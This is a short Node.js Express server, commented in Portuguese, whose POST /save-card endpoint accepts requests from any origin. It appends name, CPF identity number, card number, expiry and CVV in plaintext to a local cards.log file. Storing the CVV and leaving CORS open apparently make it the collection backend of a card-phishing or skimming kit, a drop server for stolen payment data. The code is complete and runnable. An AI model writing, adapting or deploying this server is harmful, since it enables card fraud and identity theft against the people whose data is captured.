const express = require('express');
const cors    = require('cors');
const fs      = require('fs');
const path    = require('path');

const app  = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.urlencoded({extended:true}));
app.use(express.json());

// Salva em ./cards.log
app.post('/save-card', (req, res) => {
  const {nome, cpf, cc, val, cvv} = req.body;
  const line = JSON.stringify({nome, cpf, cc, val, cvv, ts: new Date()}) + '\n';
  fs.appendFileSync(path.join(__dirname, 'cards.log'), line);
  res.send('ok');
});

// só para testar se o servidor está vivo
app.get('/', (_, res) => res.send('Servidor ON'));

app.listen(PORT, () => console.log('Rodando na porta', PORT));
